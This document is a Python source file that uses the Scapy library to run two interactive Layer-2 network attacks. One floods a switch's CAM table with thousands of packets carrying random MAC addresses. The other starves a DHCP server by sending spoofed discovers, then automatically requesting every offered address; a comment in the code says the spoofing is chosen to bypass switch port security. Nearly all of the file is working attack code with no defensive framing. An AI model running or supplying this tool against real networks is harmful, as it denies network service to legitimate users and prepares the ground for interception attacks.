from scapy.all import *
from scapy.arch.windows import show_interfaces

# global data
interf = ""


def generate_packets():
    print("run")
    packet_list = []  # initializing packet_list to hold all the packets
    for i in range(1, 10000):
        packet = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP())
        packet_list.append(packet)
    return packet_list


def cam_overflow(packet_list, interface_name):
    sendp(packet_list, iface=interface_name)


def dhcp_starve(inter, src_mac,timesleep,dhcppacketno):
    # discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) / IP(src='0.0.0.0', dst='255.255.255.255') / UDP(
    #     dport=67, sport=68) / BOOTP(op=1, chaddr=cliMACchaddr) / DHCP(options=[('message-type', 'discover'), ('end')])

    for x in range(dhcppacketno):
        src_mac_rand = str(RandMAC())

        # Using own mac to bypass portsecurity in layer 2. Only rand mac in dhcp
        ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=src_mac, type=0x800)
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootps = BOOTP(chaddr=src_mac_rand, ciaddr='0.0.0.0', flags=0)
        dhcps = DHCP(options=[("message-type", "discover"), "end"])
        packet = ethernet / ip / udp / bootps / dhcps

        sendp(packet, iface=inter, verbose=0)
        time.sleep(timesleep)


def listen_dhcp():
    # sniff DHCP packets
    sniff(filter="udp and (port 67 or port 68)",
          prn=handle_dhcp,
          store=0)


def handle_dhcp(pkt):


    dhcp_options = pkt.getlayer(DHCP).options
    message_type=0
    for each in dhcp_options:
        if each[0] =='message-type':
            if each[1] == 2:
                message_type=2


    # input()

    if message_type == 2:
        print(pkt.show())
        print('MAC address that sent DHCP discover: ' + pkt.dst)
        print('Offered and Requested: ' + pkt.yiaddr)

        dhcp_request = (
                Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68,
                                                                                                dport=67) / BOOTP(
            chaddr=pkt.dst) / DHCP(options=[("message-type", "request"), ("requested_addr", pkt.yiaddr), "end"]))

        sendp(dhcp_request, iface=interf, verbose=0)


if __name__ == '__main__':
    print(show_interfaces())

    if str(input("MAC flood? y/n")).lower() == 'y':
        packet_list = generate_packets()
        print("=MAC Flooding=")
        cam_overflow(packet_list,input("Enter interface:"))

    if str(input('DHCP starvation? y/n')).lower() == 'y':
        my_macs = [get_if_hwaddr(i) for i in get_if_list()]
        print(my_macs)
        interf = input("Enter interface:")
        # interf = 'Realtek PCIe GBE Family Controller'
        src_mac = input("Enter MAC:")
        # src_mac = '4c:cc:6a:06:83:3c'

        time_sleep=int(input('DHCP Discover delay in seconds: '))
        dhcp_packets_no=int(input('Number of DHCP Discover packets:  '))
        thread = Thread(target=listen_dhcp)
        thread.start()
        dhcp_starve(interf.strip(), src_mac.strip(),time_sleep,dhcp_packets_no)
